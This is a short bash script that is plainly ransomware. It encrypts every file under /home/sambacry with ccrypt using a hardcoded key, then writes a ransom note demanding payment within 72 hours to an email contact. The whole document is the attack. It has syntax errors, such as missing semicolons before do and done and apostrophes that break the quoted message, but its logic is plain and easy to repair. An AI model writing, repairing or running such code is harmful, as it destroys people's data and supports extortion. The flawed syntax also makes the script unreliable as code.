#!/bin/bash
    # Define secret key
unique_key='dappertest'
# Store current directory
curr_dir=$(pwd)
# Define root directory
root_dir='/home/sambacry'
# Change directory to root directory
cd "$root_dir"
# Get list of all files in root directory
files_list=$(find . -type f -name "*" -not -name ransomwaremessage.txt)
    # Encrypt each file using the secret key
for file_path in $files_list do
     # Get current file name
file_name=$(basename "$file_path")
     # Encrypt current file using ccrypt
     echo "Encryption started for: $file_name"
ccrypt -f -q -e "$file_path" -K "$unique_key" done
    # Define ransomware message
    message='We've encrypted your important files with advanced encryption. To
    retrieve them, pay within 72 hours to get a unique decryption key. Contact us
    at recovery@mail.com. Don't use any 3rd party decryption software.'
    # Save ransomware message to a file
    echo "$message" > "$root_dir"/ransomwaremessage.txt
    # Change directory back to original directory
    cd "$curr_dir"
